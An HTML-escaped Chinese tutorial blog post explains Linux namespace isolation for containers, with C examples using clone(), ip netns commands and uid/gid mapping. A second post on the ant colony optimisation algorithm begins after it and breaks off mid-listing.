&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int clone(int (*fn)(void *), void *child_stack,
    int flags, void *arg, ...
    /* pid_t *ptid, void *newtls, pid_t *ctid */ )
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;创建新的进程，同时创建新的namespace，将新创建的子进程加入到新创建的namespace中。&lt;br&gt;
&lt;strong&gt;2. unshare()&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int unshare(int flags);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;unshare()不会创建新的进程，但会把当前进程加入到新创建的namespace中，&lt;br&gt;
&lt;strong&gt;3. setns()&lt;/strong&gt;&lt;br&gt;
setns是将一个进程加入到已经存在的namespace中。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int setns(int fd, int nstype);
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;参数fd表示我们要加入的namespace的文件描述符，如：/proc/[pid]/ns下面对应的文件描述符。&lt;/li&gt;
&lt;li&gt;参数nstype让调用者可以去检查fd指向的namespace类型是否符合我们实际的要求。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;mount-namespace&#34;&gt;mount namespace&lt;/h2&gt;
&lt;p&gt;Mount namespace通过隔离文件系统挂载点对隔离文件系统提供支持。隔离后，不同的mount namespace中的文件结构发生变化也互不影响。你可以通过/proc/[pid]/mounts查看到所有挂载在当前namesapce中的文件系统，还可以通过/proc/[pid]/mountstats看到mount namespace中文件设备的统计信息，包括挂载的文件名称，文件系统类型，挂载位置等等。&lt;/p&gt;
&lt;p&gt;进程在创建mount namespace的时候，会把当前结构复制给新的namespace。 新的namespace中的所有mount操作都影响自身的文件系统，而对外界不会产生任何影响。这样做就严格地实现了隔离。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#define _GNU_SOURCE
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/wait.h&amp;gt;
#include &amp;lt;sys/mount.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sched.h&amp;gt;
#include &amp;lt;signal.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

#define STACK_SIZE (1024 * 1024)
// sync primitive
int checkpoint[2];
static char child_stack[STACK_SIZE];
char* const child_args[] = {
	&amp;quot;/bin/bash&amp;quot;,
	NULL
};

int child_main(void* arg) {
	char c;
	// init sync primitive
	close(checkpoint[1]);
	// setup hostname
	sethostname(&amp;quot;changed namespace&amp;quot;, 12);
	// remount &amp;quot;/proc&amp;quot; to get accurate &amp;quot;top&amp;quot; &amp;amp;&amp;amp; &amp;quot;ps&amp;quot; output
	mount(&amp;quot;proc&amp;quot;, &amp;quot;/proc&amp;quot;, &amp;quot;proc&amp;quot;, 0, NULL);
	// wait...
	read(checkpoint[0], &amp;amp;c, 1);
	execv(child_args[0], child_args);
	printf(&amp;quot;Ooops\n&amp;quot;);
	return 1;
}
int main() {
	// init sync primitive
	pipe(checkpoint);
	int child_pid = clone(child_main, child_stack+STACK_SIZE,
	  CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWPID | CLONE_NEWNS | SIGCHLD, NULL);
	// further init here (nothing yet)
	// signal &amp;quot;done&amp;quot;
	close(checkpoint[1]);
	waitpid(child_pid, NULL, 0);
	printf(&amp;quot;quit!\n&amp;quot;);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost ~]# gcc -Wall mntns.c -o mnt &amp;amp;&amp;amp; ./mnt
[root@changed name ~]# ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.7  0.0 122804  4100 pts/0    S    13:27   0:00 /bin/bash
root        30  0.0  0.0 151056  1816 pts/0    R+   13:28   0:00 ps aux
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;pid-namespace&#34;&gt;pid namespace&lt;/h2&gt;
&lt;p&gt;PID namespace隔离非常实用，它对进程PID重新标号,即两个不同的namespace下的进程可以拥有同一个PID。每一个PID namespace都有字的计数程序。内核为所有的PID namespace维护了一个树状结构，最顶层的是系统初始时创建的,即root namespace。他创建的新的PID namespace称child namespace。通过这种方式，不同的PID namespace会形成一个等级的体系。所属的父节点可以看到子节点中的进程，并可以通过信号等方式对子节点中的进程产生影响。反过来，子节点不能看到父节点PID namespace中的任何内容。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每个PID namespace中的第一个进程“PID 1“，都会像传统Linux中的init进程一样拥有特权，起特殊作用。&lt;/li&gt;
&lt;li&gt;一个namespace中的进程，不可能通过kill或ptrace影响父节点或者兄弟节点中的进程，因为其他节点的PID在这个namespace中没有任何意义。&lt;/li&gt;
&lt;li&gt;如果你在新的PID namespace中重新挂载/proc文件系统，会发现其下只显示同属一个PID namespace中的其他进程。&lt;/li&gt;
&lt;li&gt;在root namespace中可以看到所有的进程，并且递归包含所有子节点中的进程。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#define _GNU_SOURCE
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/wait.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sched.h&amp;gt;
#include &amp;lt;signal.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;


#define STACK_SIZE (1024*1024)

static char child_stack[STACK_SIZE];
char* const child_args[] = {
	&amp;quot;/bin/bash&amp;quot;,
	NULL
};

int child_main(void* args){
	printf(&amp;quot;in child process!\n&amp;quot;);
	sethostname(&amp;quot;changed namespace&amp;quot;, 12);
	execv(child_args[0], child_args);
	return 1;
}

int main(){
	printf(&amp;quot;program begin: \n&amp;quot;);
	int child_pid = clone(child_main, child_stack + STACK_SIZE, SIGCHLD | CLONE_NEWUTS | CLONE_NEWIPC, NULL);
	waitpid(child_pid, NULL, 0);
	printf(&amp;quot;quit\n&amp;quot;);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost ~]# gcc -Wall pid.c -o pid &amp;amp;&amp;amp; ./pid
program begin:
in child process!
[root@changed name ~]# ps aux
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行ps aux命令来查看是否实现了PID namespace的隔离；发现还会看到宿主机上的所有的进程。这是由于没有对文件系统进行隔离，ps/top之类的命令调用的是真实系统下的/proc文件内容，看到的自然是所有的进程。&lt;/p&gt;
&lt;p&gt;运行下面的mount命令来对/proc 文件系统进行隔离:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@changed name ~]# mount -t proc proc /proc
[root@changed name ~]# ps uax
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0 122804  4172 pts/1    S    20:39   0:00 /bin/bash
root        37  0.0  0.0   5184   340 pts/1    S    20:40   0:00 ./uts
root        38  0.0  0.0 122804  4176 pts/1    S    20:40   0:00 /bin/bash
root        68  0.0  0.0 151056  1816 pts/1    R+   20:42   0:00 ps uax
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;uts-namespace&#34;&gt;uts namespace&lt;/h2&gt;
&lt;p&gt;UTS namespace提供了主机名和域名的隔离，这样每一个容器就可以拥有独立的主机名和域名，在网络上可以被视为一个独立的节点而非宿主机上的一个进程。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#define _GNU_SOURCE
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/wait.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sched.h&amp;gt;
#include &amp;lt;signal.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;


#define STACK_SIZE (1024*1024)

static char child_stack[STACK_SIZE];
char* const child_args[] = {
	&amp;quot;/bin/bash&amp;quot;,
	NULL
};

int child_main(void* args){
	printf(&amp;quot;in child process!\n&amp;quot;);
	sethostname(&amp;quot;changed namespace&amp;quot;, 12);
	execv(child_args[0], child_args);
	return 1;
}

int main(){
	printf(&amp;quot;program begin: \n&amp;quot;);
	int child_pid = clone(child_main, child_stack + STACK_SIZE, SIGCHLD|CLONE_NEWUTS, NULL);
	waitpid(child_pid, NULL, 0);
	printf(&amp;quot;quit\n&amp;quot;);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost ~]# gcc -Wall uts.c -o uts &amp;amp;&amp;amp; ./uts
program begin:
in child process!
[root@changed name ~]# exit
exit
quit
[root@localhost ~]#
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;ipc-namespace&#34;&gt;ipc namespace&lt;/h2&gt;
&lt;p&gt;容器中进程间的通信采用的方式包括: 信号量，消息队列和共享内存。与虚拟机不同的是，容器内部进程间通信对宿主机来说，实际上是具有相同的PID namespace中的进程间通信，因此需要一个而唯一的标识符来进行区别。申请IPC资源就申请了这样一个全局唯一的32位ID，所以IPC namespace中实际上包含了系统IPC标识符以及实现POSIX消息队列的文件系统。在同一个IPC namespace下的进程彼此可见，而与其他的IPC namespace下的进程则互相不可见。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#define _GNU_SOURCE
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/wait.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sched.h&amp;gt;
#include &amp;lt;signal.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;


#define STACK_SIZE (1024*1024)

static char child_stack[STACK_SIZE];
char* const child_args[] = {
	&amp;quot;/bin/bash&amp;quot;,
	NULL
};

int child_main(void* args){
	printf(&amp;quot;in child process!\n&amp;quot;);
	sethostname(&amp;quot;changed namespace&amp;quot;, 12);
	execv(child_args[0], child_args);
	return 1;
}

int main(){
	printf(&amp;quot;program begin: \n&amp;quot;);
	int child_pid = clone(child_main, child_stack + STACK_SIZE, SIGCHLD | CLONE_NEWUTS | CLONE_NEWIPC, NULL);
	waitpid(child_pid, NULL, 0);
	printf(&amp;quot;quit\n&amp;quot;);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;首先我们先使用ipcmk -Q命令创建一个queue:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@locahost ~]# ipcmk -Q
消息队列 id：32769
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用ipcs -q查看queue是否创建成功:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost ~]# ipcs -q
--------- 消息队列 -----------
键        msqid      拥有者  权限     已用字节数 消息
0x6d2ba356 0          root       644        0            0
0xe88b6229 32769      root       644        0            0
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;编译并运行ipc.c代码对IPC进行隔离并进行验证:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost~]# gcc -Wall ipc.c -o ipc &amp;amp;&amp;amp; ./ipc
program begin:
in child process!
[root@changed name ~]# ipcs -q
--------- 消息队列 -----------
键        msqid      拥有者  权限     已用字节数 消息
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从运行的结果来看，已经找不到原先声明的message queue，实现了IPC的隔离。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;net-namespace&#34;&gt;net namespace&lt;/h2&gt;
&lt;p&gt;Net namespace主要提供关于网络资源的隔离，包括网络设备IPv4和IPv6协议栈，IP路由表，防火墙，/proc/net目录，/sys/class/net目录，端口等等。一个物理的网络设备最多存在一个net namespace中，你可以创建veth pair(虚拟网路设备对:有两端如果有数据从一端传入另一端也能收到，反之亦然)在不同的network namespace间创建通道依次达到通信的目的。&lt;/p&gt;
&lt;p&gt;一般情况下，物理网络设备都分配在最初的root namespace中，但是如果你有多块物理网卡，也可以把其中一块或多块分配给新创建的network namespace。需要注意的是，当新创建的network namespace被释放时（所有内部的进程都终止并且namespace文件没有被挂载或打开），在这个namespace中的物理网卡会返回到root namespace而非创建该进程的父进程所在的network namespace。&lt;/p&gt;
&lt;p&gt;当我们说到network namespace时，其实我们指的未必是真正的网络隔离，而是把网络独立出来，给外部用户一种透明的感觉，仿佛跟另外一个网络实体在进行通信。为了达到这个目的，容器的经典做法就是创建一个veth pair，一端放置在新的namespace中，通常命名为eth0，一端放在原先的namespace中连接物理网络设备，再通过网桥把别的设备连接进来或者进行路由转发，以此网络实现通信的目的。&lt;/p&gt;
&lt;p&gt;也许有读者会好奇，在建立起veth pair之前，新旧namespace该如何通信呢？答案是pipe（管道）。我们以Docker Daemon在启动容器dockerinit的过程为例。Docker Daemon在宿主机上负责创建这个veth pair，通过netlink调用，把一端绑定到docker0网桥上，一端连进新建的network namespace进程中。建立的过程中，Docker Daemon和dockerinit就通过pipe进行通信，当Docker Daemon完成veth-pair的创建之前，dockerinit在管道的另一端循环等待，直到管道另一端传来Docker Daemon关于veth设备的信息，并关闭管道。dockerinit才结束等待的过程，并把它的“eth0”启动起来。&lt;/p&gt;
&lt;p&gt;跟其他namespace类似，对network namespace的使用其实就是在创建的时候添加CLONE_NEWNET标识位。也可以通过命令行工具ip创建network namespace。在代码中建立和测试network namespace较为复杂，所以下文主要通过ip命令直观的感受整个network namespace网络建立和配置的过程。&lt;/p&gt;
&lt;p&gt;首先我们可以创建一个命名为test_ns的network namespace:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@localhost ~]# ip netns add test_ns
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;当ip命令工具创建一个network namespace时，会默认创建一个回环设备（loopback interface：lo），并在/var/run/netns目录下绑定一个挂载点，这就保证了就算network namespace中没有进程在运行也不会被释放，也给系统管理员对新创建的network namespace进行配置提供了充足的时间。&lt;/p&gt;
&lt;p&gt;通过ip netns exec命令可以在新创建的network namespace下运行网络管理命令。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost ~]# ip netns exec test_ns ip link list
1: lo: &amp;lt;LOOPBACK&amp;gt; mtu 65536 qdisc noop state DOWN mode DEFAULT qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面的命令为我们展示了新建的namespace下可见的网络链接，可以看到状态是DOWN,需要再通过命令去启动。可以看到，此时执行ping命令是无效的。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost ~]# ip netns exec test_ns ping 127.0.01
connect: 网络不可达
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;启动命令如下，可以看到启动后再测试就可以ping通。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost ~]# ip netns exec test_ns ip link set dev lo up
[root@localhost ~]# ip netns exec test_ns ip link list
1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
[root@localhost ~]# ip netns exec test_ns ping 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.087 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.060 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.062 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样只是启动了本地的回环，要实现与外部namespace进行通信还需要再建一个网络设备对，命令如下。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost ~]# ip link add veth0 type veth peer name veth1
[root@localhost ~]# ip link set veth1 netns test_ns
[root@localhost ~]# ip netns exec test_ns ifconfig veth1 10.1.1.1/24 up
[root@localhost ~]# ifconfig veth0 10.1.1.2/24 up
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;第一条命令创建了一个网络设备对，所有发送到veth0的包veth1也能接收到，反之亦然&lt;/li&gt;
&lt;li&gt;第二条命令则是把veth1这一端分配到test_ns这个network namespace。&lt;/li&gt;
&lt;li&gt;第三、第四条命令分别给test_ns内部和外部的网络设备配置IP，veth1的IP为10.1.1.1，veth0的IP为10.1.1.2。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;此时两边就可以互相连通了，效果如下。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@localhost ~]# ping 10.1.1.1
PING 10.1.1.1 (10.1.1.1) 56(84) bytes of data.
64 bytes from 10.1.1.1: icmp_seq=1 ttl=64 time=0.038 ms
64 bytes from 10.1.1.1: icmp_seq=2 ttl=64 time=0.057 ms
^C
--- 10.1.1.1 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 999ms
rtt min/avg/max/mdev = 0.038/0.047/0.057/0.011 ms
[root@localhost ~]# ip netns exec test_ns ping 10.1.1.2
PING 10.1.1.2 (10.1.1.2) 56(84) bytes of data.
64 bytes from 10.1.1.2: icmp_seq=1 ttl=64 time=0.048 ms
64 bytes from 10.1.1.2: icmp_seq=2 ttl=64 time=0.060 ms
^C
--- 10.1.1.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 999ms
rtt min/avg/max/mdev = 0.048/0.054/0.060/0.006 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;删除net namespace:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@localhost ~]# ip netns delete test_ns
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;user-namespace&#34;&gt;user namespace&lt;/h2&gt;
&lt;p&gt;User namespace主要隔离了安全相关的标识符和属性，包括用户ID,用户组ID,root目录等。通俗点就是: 一个普通用户的进程通过clone()创建新的进程在新user namespace中可以拥有不同的用户和用户组。&lt;strong&gt;这意味着一个进程在容器外属于一个没有特殊权限的普通用户，但是它创建的容器进程却属于拥有所有权限的超级用户，这个技术为容器提供了极大的自由。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Linux中，特权用户的user ID是0，演示的最终我们将看到user ID非0的进程启动user namespace后user ID可以变为0。使用user namespace的方法和其它的namespace的使用方式没有太大的区别。即调用clone()的时候，需要加入CLONE_NEWUSER标识位。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#define _GNU_SOURCE
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/wait.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sched.h&amp;gt;
#include &amp;lt;signal.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/capability.h&amp;gt;

#define STACK_SIZE (1024 * 1024)

static char child_stack[STACK_SIZE];
char* const child_args[] = {
  &amp;quot;/bin/bash&amp;quot;,
  NULL
};

int child_main(void* args) {
  printf(&amp;quot;in child program!\n&amp;quot;);
  cap_t caps;
  printf(&amp;quot;eUID = %ld; eGID = %ld;&amp;quot;, (long)geteuid(), (long)getegid());
  caps = cap_get_proc();
  printf(&amp;quot;capabilities: %s\n&amp;quot;, cap_to_text(caps, NULL));
  execv(child_args[0], child_args);
  return 1;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# 在编译并执行代码之前，我们先来看下当前的用户uid和gid.
$ id -u
1000
$ id -g
1000

# 现在编译并运行我们的代码来验证user namespace是否隔离成功：
# 注意: 如果编译时如下报错:
fatal error: sys/capability.h: No such file or directory
compilation terminated.
# 则在ubuntu编译则需要安装libcap-dev包,如果在centos上编译则需要安装libcap-devel包。
# 运行的结果如下:
[root@localhost ~]# gcc userns.c -Wall -lcap -o userns &amp;amp;&amp;amp; ./userns 
program begin: 
in child program!
eUID = 65534; eGID = 65534;capabilities: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+ep
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;user namespace被创建后，第一个进程被赋予了该namespace中的全部权限，这样这个init进程就可以完成所有必要的初始化工作，而不会因权限不足而出现错误。&lt;/li&gt;
&lt;li&gt;我们看到namespace内部看到的UID和GID已经与外部不同了，默认显示为65534，表示尚未与外部namespace用户映射。我们需要对user namespace内部的这个初始user和其外部namespace某个用户建立映射，这样可以保证当涉及到一些对外部namespace的操作时，系统可以检验其权限（比如发送一个信号或操作某个文件）。同样用户组也要建立映射。&lt;/li&gt;
&lt;li&gt;还有一点虽然不能从输出中看出来，但是值得注意。用户在新namespace中有全部权限，但是他在创建他的父namespace中不含任何权限。就算调用和创建他的进程有全部权限也是如此。所以哪怕是root用户调用了clone()在user namespace中创建出的新用户在外部也没有任何权限。&lt;/li&gt;
&lt;li&gt;最后，user namespace的创建其实是一个层层嵌套的树状结构。最上层的根节点就是root namespace，新创建的每个user namespace都有一个父节点user namespace以及零个或多个子节点user namespace，这一点与PID namespace非常相似。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;接下来我们就要进行用户绑定操作，通过在/proc/[pid]/uid_map和/proc/[pid]/gid_map两个文件中写入对应的绑定信息可以实现这一点，格式：&lt;code&gt;ID-inside-ns   ID-outside-ns   length&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;写这两个文件需要注意以下几点。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;两个文件只允许由拥有该user namespace中CAP_SETUID权限的进程写入一次，不允许修改。&lt;/li&gt;
&lt;li&gt;写入的进程必须是该user namespace的父namespace或者子namespace。&lt;/li&gt;
&lt;li&gt;第一个字段ID-inside-ns表示新建的user namespace中对应的user/group ID，第二个字段ID-outside-ns表示namespace外部映射的user/group ID。最后一个字段表示映射范围，通常填1，表示只映射一个，如果填大于1的值，则按顺序建立一一映射。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;明白了上述原理，我们再次修改代码，添加设置uid和guid的函数。测试的代码如下:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#define _GNU_SOURCE
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/wait.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sched.h&amp;gt;
#include &amp;lt;signal.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/capability.h&amp;gt;

#define STACK_SIZE (1024 * 1024)

static char child_stack[STACK_SIZE];
char* const child_args[] = {
  &amp;quot;/bin/bash&amp;quot;,
  NULL
};

void set_uid_map(pid_t pid, int inside_id, int outside_id, int length) {
    char path[256];
    sprintf(path, &amp;quot;/proc/%d/uid_map&amp;quot;, getpid());
    FILE* uid_map = fopen(path, &amp;quot;w&amp;quot;);
    fprintf(uid_map, &amp;quot;%d %d %d&amp;quot;, inside_id, outside_id, length);
    fclose(uid_map);
}
void set_gid_map(pid_t pid, int inside_id, int outside_id, int length) {
    char path[256];
    sprintf(path, &amp;quot;/proc/%d/gid_map&amp;quot;, getpid());
    FILE* gid_map = fopen(path, &amp;quot;w&amp;quot;);
    fprintf(gid_map, &amp;quot;%d %d %d&amp;quot;, inside_id, outside_id, length);
    fclose(gid_map);
}

int child_main(void* args) {
  printf(&amp;quot;in child program!\n&amp;quot;);
  cap_t caps;
  set_uid_map(getpid(), 0, 1000, 1);
  set_gid_map(getpid(), 0, 1000, 1);
  printf(&amp;quot;eUID = %ld; eGID = %ld;&amp;quot;, (long)geteuid(), (long)getegid());
  caps = cap_get_proc();
  printf(&amp;quot;capabilities: %s\n&amp;quot;, cap_to_text(caps, NULL));
  execv(child_args[0], child_args);
  return 1;
}

int main() {
  printf(&amp;quot;program begin: \n&amp;quot;);
  int child_pid = clone(child_main, child_stack + STACK_SIZE, SIGCHLD | CLONE_NEWUSER, NULL);
  waitpid(child_pid, NULL, 0);
  printf(&amp;quot;quit\n&amp;quot;);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;编译后即可看到user已经变成了root。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ gcc userns.c -Wall -lcap -o userns &amp;amp;&amp;amp; ./userns 
program begin: 
in child program!
eUID = 0; eGID = 0;capabilities: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+ep
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;至此，你就已经完成了绑定的工作，可以看到演示全程都是在普通用户下执行的。最终实现了在user namespace中成为了root而对应到外面的是一个uid为1000的普通用户。&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;容器的隔离实现基本就是通过Linux内核提供的这6种namespace实现。但是容器依旧没有实现完全的环境隔离。比如: SELinux,Cgroups以及/sys,/proc/sys, /dev/sd*等目录下的资源依据是没有被隔离的。因此我们通常使用的ps， top命令查看到的数据依旧是宿主机的数据。因为它们的数据来源于/proc等目录下的文件。&lt;/p&gt;
&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
&lt;p&gt;https://xigang.github.io/2018/10/14/namespace-md/&lt;/p&gt;
">【容器】04 namespace</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/yi-qun-yi-chuan-wei-li-qun/"" data-c="
          &lt;h3 id=&#34;蚁群算法&#34;&gt;蚁群算法&lt;/h3&gt;
&lt;p&gt;蚁群算法ACO是一种智能算法，它由一群无智能或轻微智能的个体，通过相互写作表现出智能行为，从而为求解复杂问题提供了一个新的可能性。&lt;/p&gt;
&lt;p&gt;蚁群算法是一种仿生学算法，是由自然界中蚂蚁觅食的行为而启发的。在自然界中，蚂蚁觅食过程中，蚁群总能够按照寻找到一条从蚁巢和食物源的最优路径。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1638754190435.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;假如蚁群中所有蚂蚁的数量为m，所有城市之间的信息素用矩阵pheromone表示，最短路径为bestLength，最佳路径为bestTour。每只蚂蚁都有自己的内存，内存中用一个禁忌表（Tabu）来存储该蚂蚁已经访问过的城市，表示其在以后的搜索中将不能访问这些城市；还有用另外一个允许访问的城市表（Allowed）来存储它还可以访问的城市；另外还用一个矩阵（Delta）来存储它在一个循环（或者迭代）中给所经过的路径释放的信息素；还有另外一些数据，例如一些控制参数(α，β，ρ，Q)，该蚂蚁行走完全程的总成本或距离（tourLength），等等。假定算法总共运行MAX_GEN次，运行时间为t。&lt;/p&gt;
&lt;p&gt;步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;初始化；&lt;/li&gt;
&lt;li&gt;为每个蚂蚁选择下一个节点；&lt;/li&gt;
&lt;li&gt;更新信息素矩阵；&lt;/li&gt;
&lt;li&gt;检查终止条件；&lt;br&gt;
如果达到最大代数MAX_GEN，算法终止，转到5，否则，重新初始化所有蚂蚁的Delt矩阵为0，Tatu表清空，Allowed表中加入所有的城市节点。随机选择它们的起始位置。在Tabu中加入起始节点，Allowed中去掉该起始节点，重复执行2，3，4步；&lt;/li&gt;
&lt;li&gt;输出最优值。&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;作者：王荣胜
链接：https://zhuanlan.zhihu.com/p/137408401
来源：知乎
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

# -*- coding: utf-8 -*-
import random
import copy
import time
import sys
import math
import tkinter #//GUI模块
import threading
from functools import reduce


# 参数
&#39;&#39;&#39;
ALPHA:信息启发因子，值越大，则蚂蚁选择之前走过的路径可能性就越大
      ，值越小，则蚁群搜索范围就会减少，容易陷入局部最优
BETA:Beta值越大，蚁群越就容易选择局部较短路径，这时算法收敛速度会
     加快，但是随机性不高，容易得到局部的相对最优
&#39;&#39;&#39;
(ALPHA, BETA, RHO, Q) = (1.0,2.0,0.5,100.0)
# 城市数，蚁群
(city_num, ant_num) = (50,50)
distance_x = [
    178,272,176,171,650,499,267,703,408,437,491,74,532,
